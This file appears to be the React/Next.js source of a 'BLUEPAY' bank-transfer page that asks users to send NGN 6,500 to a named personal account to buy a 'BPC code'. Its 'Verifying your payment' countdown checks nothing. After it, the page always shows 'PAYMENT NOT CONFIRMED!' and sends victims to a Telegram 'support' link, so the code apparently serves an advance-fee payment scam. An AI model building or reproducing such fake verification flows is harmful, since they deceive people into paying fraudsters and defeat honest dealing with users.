"use client"

import { Button } from "@/components/ui/button"
import { ArrowLeft, MessageSquare, Copy, Eye, EyeOff, X } from "lucide-react"
import { useRouter } from "next/navigation"
import { useState, useEffect } from "react"

export default function BankTransferPage() {
  const router = useRouter()
  const [copiedField, setCopiedField] = useState<string | null>(null)
  const [isVerifying, setIsVerifying] = useState(false)
  const [showServicesModal, setShowServicesModal] = useState(false)
  const [showStatus, setShowStatus] = useState(false)
  const [showFeeText, setShowFeeText] = useState(false)
  const [userEmail, setUserEmail] = useState("")
  const [countdown, setCountdown] = useState(0)

  useEffect(() => {
    const userData = localStorage.getItem("bluepay_user")
    if (userData) {
      const user = JSON.parse(userData)
      setUserEmail(user.email || "")
    }
  }, [])

  const bankDetails = {
    amount: "NGN 6500",
    accountNumber: "3211850611",
    bankName: "PAGA MFB",
    accountName: "BLUEPAY AGENT - KELVIN",
  }

  const copyToClipboard = (text: string, field: string) => {
    navigator.clipboard.writeText(text)
    setCopiedField(field)
    setTimeout(() => setCopiedField(null), 2000)
  }

  const handleVerification = () => {
    setIsVerifying(true)
    setCountdown(10)

    const interval = setInterval(() => {
      setCountdown((prev) => {
        if (prev <= 1) {
          clearInterval(interval)
          setIsVerifying(false)
          setShowServicesModal(true)
          return 0
        }
        return prev - 1
      })
    }, 1000)
  }

  const handleServicesModalClose = () => {
    setShowServicesModal(false)
    setShowStatus(true)
  }

  if (showServicesModal) {
    return (
      <div className="fixed inset-0 bg-black/50 z-50 flex items-center justify-center p-4">
        <div className="bg-white rounded-3xl p-8 max-w-md w-full">
          {/* Placeholder Image */}
          <div className="w-24 h-24 bg-blue-500 rounded-lg mx-auto mb-6 flex items-center justify-center">
            <span className="text-white text-sm">imgbb.com</span>
          </div>

          <h2 className="text-2xl font-bold text-red-500 text-center mb-4">All Services Restored</h2>

          <p className="text-gray-700 text-center mb-6">Opay and all others supported banks are working perfectly.</p>

          <div className="bg-red-50 border border-red-200 rounded-xl p-4 mb-6">
            <p className="text-red-600 text-center text-sm">
              All banking banks including opay are now fully operational and available for your payment.
            </p>
          </div>

          <Button
            onClick={handleServicesModalClose}
            className="w-full bg-[#0000FF] hover:bg-[#0000DD] text-white py-6 rounded-xl text-lg font-semibold"
          >
            I Understand
          </Button>
        </div>
      </div>
    )
  }

  if (showStatus) {
    return (
      <div className="min-h-screen bg-gray-50 flex flex-col">
        {/* Sub Header */}
        <div className="bg-white border-b px-4 py-4 flex items-center justify-between">
          <h2 className="text-xl font-semibold text-gray-800">Bank Transfer</h2>
          <button onClick={() => router.push("/dashboard")} className="text-red-500 font-semibold">
            Cancel
          </button>
        </div>

        {/* Main Content */}
        <main className="flex-1 px-4 py-6 max-w-2xl mx-auto w-full">
          {/* User Info */}
          <div className="flex items-center gap-4 mb-6">
            <div className="w-16 h-16 bg-[#3730a3] rounded-full flex items-center justify-center">
              <span className="text-white text-2xl font-bold">₦</span>
            </div>
            <div className="flex-1 text-right">
              <p className="text-3xl font-bold text-gray-900">NGN 6,500</p>
              <p className="text-gray-600">{userEmail}</p>
            </div>
          </div>

          {/* Instruction Text */}
          <p className="text-center text-gray-700 mb-8">Proceed to your bank app to complete this Transfer</p>

          {/* Error Status */}
          <div className="flex flex-col items-center mb-8">
            <div className="w-32 h-32 bg-red-500 rounded-full flex items-center justify-center mb-6 shadow-lg">
              <X className="w-16 h-16 text-white stroke-[3]" />
            </div>
            <h2 className="text-2xl font-bold text-orange-500 mb-4">PAYMENT NOT CONFIRMED!</h2>
            <p className="text-gray-600 text-center mb-8">
              Your payment wasn't confirmed. contact us on email for help
            </p>

            {/* Hidden Fee Field */}
            <div className="w-full bg-white rounded-lg border border-gray-300 p-4 flex items-center justify-between mb-4">
              <div className="flex-1">
                {showFeeText ? (
                  <p className="text-gray-900 font-semibold">FEE NOT CONFIRMED</p>
                ) : (
                  <p className="text-gray-900 tracking-widest">••••••••••••••••</p>
                )}
              </div>
              <button onClick={() => setShowFeeText(!showFeeText)} className="text-gray-600 hover:text-gray-900">
                {showFeeText ? <EyeOff className="w-6 h-6" /> : <Eye className="w-6 h-6" />}
              </button>
            </div>

            {/* Contact Support Button */}
            <Button
              onClick={() => window.open("https://t.me/cashtubspport", "_blank")}
              className="w-full bg-[#0000FF] hover:bg-[#0000DD] text-white py-6 rounded-xl text-lg font-semibold"
            >
              Contact Support
            </Button>
          </div>
        </main>

        {/* Floating Chat Button */}
        <button className="fixed bottom-6 right-6 w-14 h-14 bg-[#0000FF] rounded-full flex items-center justify-center shadow-xl hover:bg-[#0000DD] transition-colors z-40">
          <MessageSquare className="w-6 h-6 text-white" />
        </button>
      </div>
    )
  }

  if (isVerifying) {
    return (
      <div className="min-h-screen bg-gray-50 flex flex-col">
        {/* Header */}
        <header className="bg-[#2d3748] text-white px-4 py-4">
          <h1 className="text-xl font-bold tracking-wider text-center">BLUEPAY</h1>
        </header>

        {/* Verification Content */}
        <main className="flex-1 flex flex-col items-center justify-center px-4">
          {/* Circular Progress with Countdown */}
          <div className="relative w-32 h-32 mb-8">
            <svg className="w-32 h-32 transform -rotate-90">
              <circle cx="64" cy="64" r="56" stroke="#e5e7eb" strokeWidth="8" fill="none" />
              <circle
                cx="64"
                cy="64"
                r="56"
                stroke="#0000FF"
                strokeWidth="8"
                fill="none"
                strokeDasharray={`${(countdown / 10) * 351.86} 351.86`}
                className="transition-all duration-1000"
              />
            </svg>
            <div className="absolute inset-0 flex items-center justify-center">
              <span className="text-4xl font-bold text-gray-900">{countdown}</span>
            </div>
          </div>

          <h2 className="text-3xl font-bold text-gray-900 mb-3 text-center">Verifying your payment</h2>
          <p className="text-gray-600 text-center max-w-md">Please wait while we confirm your bank transfer...</p>
        </main>

        {/* Floating Chat Button */}
        <button className="fixed bottom-6 right-6 w-14 h-14 bg-[#0000FF] rounded-full flex items-center justify-center shadow-xl hover:bg-[#0000DD] transition-colors z-40">
          <MessageSquare className="w-6 h-6 text-white" />
        </button>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col">
      {/* Header */}
      <header className="bg-[#2d3748] text-white px-4 py-4">
        <h1 className="text-xl font-bold tracking-wider text-center">BLUEPAY</h1>
      </header>

      {/* Sub Header */}
      <div className="bg-white border-b px-4 py-4 flex items-center justify-between">
        <div className="flex items-center gap-3">
          <button onClick={() => router.back()} className="text-gray-800">
            <ArrowLeft className="w-6 h-6" />
          </button>
          <h2 className="text-xl font-semibold text-gray-800">Bank Transfer</h2>
        </div>
        <button onClick={() => router.push("/dashboard")} className="text-red-500 font-semibold">
          Cancel
        </button>
      </div>

      {/* Main Content */}
      <main className="flex-1 px-4 py-6 max-w-2xl mx-auto w-full">
        {/* Amount Display */}
        <div className="text-center mb-8">
          <h1 className="text-5xl font-bold text-gray-900 mb-2">NGN 6,500</h1>
          <p className="text-gray-600 text-lg">BPC Code Purchase</p>
        </div>

        {/* Instructions */}
        <div className="mb-8">
          <h3 className="text-[#0000FF] text-xl font-semibold mb-4">Instructions:</h3>
          <ol className="space-y-3 text-[#0000FF]">
            <li className="flex gap-2">
              <span className="font-semibold">1.</span>
              <span>Copy the account details below</span>
            </li>
            <li className="flex gap-2">
              <span className="font-semibold">2.</span>
              <span>Open your bank app and make a transfer</span>
            </li>
            <li className="flex gap-2">
              <span className="font-semibold">3.</span>
              <span>Return here and click "I have made this bank Transfer"</span>
            </li>
            <li className="flex gap-2">
              <span className="font-semibold">4.</span>
              <span>Wait for confirmation (usually within 3 minutes)</span>
            </li>
          </ol>
        </div>

        {/* Bank Details Card */}
        <div className="bg-white rounded-2xl shadow-sm border border-gray-200 p-6 space-y-6">
          {/* Amount */}
          <div className="flex items-center justify-between pb-4 border-b">
            <div>
              <p className="text-gray-500 text-sm mb-1">Amount</p>
              <p className="text-2xl font-bold text-gray-900">{bankDetails.amount}</p>
            </div>
            <Button
              onClick={() => copyToClipboard("6500", "amount")}
              className="bg-[#0000FF] hover:bg-[#0000DD] text-white px-6 py-2 rounded-lg flex items-center gap-2"
            >
              <Copy className="w-4 h-4" />
              {copiedField === "amount" ? "Copied!" : "Copy"}
            </Button>
          </div>

          {/* Account Number */}
          <div className="flex items-center justify-between pb-4 border-b">
            <div>
              <p className="text-gray-500 text-sm mb-1">Account Number</p>
              <p className="text-2xl font-bold text-gray-900">{bankDetails.accountNumber}</p>
            </div>
            <Button
              onClick={() => copyToClipboard(bankDetails.accountNumber, "account")}
              className="bg-[#0000FF] hover:bg-[#0000DD] text-white px-6 py-2 rounded-lg flex items-center gap-2"
            >
              <Copy className="w-4 h-4" />
              {copiedField === "account" ? "Copied!" : "Copy"}
            </Button>
          </div>

          {/* Bank Name */}
          <div className="pb-4 border-b">
            <p className="text-gray-500 text-sm mb-1">Bank Name</p>
            <p className="text-2xl font-bold text-gray-900">{bankDetails.bankName}</p>
          </div>

          {/* Account Name */}
          <div>
            <p className="text-gray-500 text-sm mb-1">Account Name</p>
            <p className="text-2xl font-bold text-gray-900">{bankDetails.accountName}</p>
          </div>
        </div>

        {/* Info Text */}
        <p className="text-center text-gray-600 mt-6 mb-6">Pay to this specific account and get your BPC code</p>

        {/* Confirm Button */}
        <Button
          onClick={handleVerification}
          className="w-full bg-[#0000FF] hover:bg-[#0000DD] text-white py-6 rounded-xl text-lg font-semibold"
        >
          I have made this bank Transfer
        </Button>
      </main>

      {/* Floating Chat Button */}
      <button className="fixed bottom-6 right-6 w-14 h-14 bg-[#0000FF] rounded-full flex items-center justify-center shadow-xl hover:bg-[#0000DD] transition-colors z-40">
        <MessageSquare className="w-6 h-6 text-white" />
      </button>
    </div>
  )
}
